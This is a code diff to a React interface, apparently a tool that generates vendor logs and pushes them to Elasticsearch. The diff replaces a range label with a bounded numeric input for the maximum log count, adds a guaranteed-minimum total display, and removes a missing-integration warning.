-                    <div className="flex justify-between text-[10px] text-gray-500"><span>10</span><span>250</span><span>500</span></div>
+                    <input type="number" min="1" max="10000" step="10" value={maxLogs} onChange={e=>setMaxLogs(Math.min(10000,Math.max(1,Number(e.target.value)||1)))} className="w-full bg-gray-800 border border-gray-600 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
+                    {(()=>{const sum=selected.reduce((s,vid)=>s+(vendorMinLogs[vid]||50),0);return(<div className="flex justify-between text-[10px] text-gray-500"><span>min guaranteed: <span className={sum>maxLogs?'text-amber-400 font-semibold':''}>{sum.toLocaleString()}</span></span><span>max 10,000</span></div>);})()}
                   </div>
                   <div className="space-y-1.5">
                     <label className="text-xs text-gray-400">Time Range</label>
@@ -476,7 +681,6 @@ export default function App(){
                     {pushing?'⟳ Pushing…':'⬆ Push to Elasticsearch'}
                   </Button>
                 </div>
-                {missingInteg.length>0&&<div className="flex gap-2.5 p-3 rounded-lg bg-amber-500/10 border border-amber-500/30 text-xs text-amber-300">⚠ Missing Fleet integrations: {missingInteg.map(id=>VENDORS.find(v=>v.id===id)?.name).join(', ')} — logs pushed but may not parse correctly.</div>}
                 <LogViewer logs={logs} vendorLabels={Object.fromEntries(VENDORS.map(v=>[v.id,v.name]))}/>
               </div>
             )}
